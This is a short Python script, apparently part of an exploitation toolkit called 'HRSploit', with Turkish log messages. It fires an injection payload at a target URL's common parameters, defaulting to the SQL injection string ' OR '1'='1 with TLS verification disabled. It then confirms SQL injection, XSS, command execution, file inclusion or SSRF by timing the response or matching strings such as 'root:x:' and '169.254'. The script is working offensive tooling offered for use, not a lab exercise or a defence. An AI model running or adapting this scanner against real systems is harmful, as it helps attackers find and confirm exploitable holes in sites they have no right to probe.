#!/usr/bin/env python3
"""HRSploit Verification Engine."""
import sys, requests, ast, time
from pathlib import Path
requests.packages.urllib3.disable_warnings()
from datetime import datetime

def log(m): print(f"[{datetime.now().strftime('%H:%M:%S')}][VERIFY] {m}", flush=True)

def verify(target, payload, vuln_type="SQLi"):
    log(f"Dogrulama: {vuln_type} @ {target}")
    sess = requests.Session(); sess.verify = False
    indicators = {"SQLi":["sql","mysql","error","syntax"],"XSS":["<script","onerror","alert"],
                  "RCE":["uid=","root:x:"],"LFI":["root:x:0"],"SSRF":["169.254","127.0.0.1"]}
    inds = indicators.get(vuln_type, ["error","warning"])
    confirmed = False
    for param in ("id","q","search","user","page","file"):
        try:
            t0=time.time(); r=sess.get(target,params={param:payload},timeout=10); dt=time.time()-t0
            if vuln_type=="SQLi" and dt>=2.5 and "SLEEP" in payload.upper():
                log(f"Time-based SQLi dogrulandi! {dt:.2f}s"); confirmed=True; break
            if any(ind in r.text.lower() for ind in inds):
                log(f"Yanit bazli dogrulama: {param}={payload[:30]}"); confirmed=True; break
        except Exception: pass
    log(f"Sonuc: {'DOGRULANDI' if confirmed else 'DOGRULANAMADI'}")
    return confirmed

if __name__ == "__main__":
    target  = sys.argv[1] if len(sys.argv)>1 else input("URL: ").strip()
    payload = sys.argv[2] if len(sys.argv)>2 else "' OR '1'='1"
    verify(target, payload)
